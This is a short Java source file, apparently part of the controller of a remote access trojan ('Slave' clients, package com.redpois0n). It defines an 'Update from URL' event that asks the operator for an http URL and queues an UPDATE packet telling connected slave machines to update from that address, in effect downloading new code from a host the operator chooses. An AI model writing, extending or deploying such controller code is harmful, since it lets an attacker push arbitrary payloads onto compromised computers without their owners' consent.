package com.redpois0n.events;

import javax.swing.ImageIcon;
import javax.swing.JOptionPane;

import com.redpois0n.Slave;
import com.redpois0n.packets.OutgoingHeader;
import com.redpois0n.packets.incoming.PacketBuilder;
import com.redpois0n.utils.IconUtils;
import com.redpois0n.utils.Util;


public class UpdateFromURLEvent extends Event {

	public ImageIcon icon = IconUtils.getIcon(getIcon(), true);
	public String url;

	public UpdateFromURLEvent(String name) {
		super(name);
	}

	@Override
	public Object[] getDisplayData() {
		return new Object[] { icon, super.name, toString(), url };
	}

	@Override
	public void perform(Slave sl) {
		sl.addToSendQueue(new PacketBuilder(OutgoingHeader.UPDATE, url));
	}

	@Override
	public String toString() {
		return "Update from URL";
	}

	@Override
	public boolean add() {
		String result = Util.showDialog("Update from URL", "Input URL to update with");
		if (result == null) {
			return false;
		}
		if (!result.startsWith("http://")) {
			JOptionPane.showMessageDialog(null, "Input valid URL!", "Download URL", JOptionPane.ERROR_MESSAGE);
			return false;
		}
		url = result.trim().replace(" ", "%20");
		return true;
	}

	@Override
	public String getIcon() {
		return "update";
	}

}
